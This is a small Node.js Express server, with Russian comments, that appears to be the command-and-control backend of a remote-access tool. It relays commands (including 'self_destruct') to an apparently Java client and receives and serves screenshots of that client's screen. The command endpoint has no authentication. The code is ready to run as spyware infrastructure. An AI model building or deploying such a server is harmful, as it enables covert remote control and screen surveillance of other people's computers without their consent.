const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const app = express();

app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(bodyParser.json({ limit: '50mb' }));

let lastCommand = "none";
let lastScreen = "";

// Принудительная отправка интерфейса
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Команды для Java
app.get('/get-command', (req, res) => {
    res.send(lastCommand);
    if (lastCommand === "self_destruct") lastCommand = "none";
});

// Установка команды из админки
app.get('/set-command', (req, res) => {
    lastCommand = req.query.cmd || "none";
    res.send("Команда принята");
});

// Работа со скриншотами
app.post('/upload-screen', (req, res) => {
    lastScreen = req.body.img || "";
    res.sendStatus(200);
});

app.get('/get-screen', (req, res) => {
    res.send(lastScreen);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server live on port ${PORT}`);
});
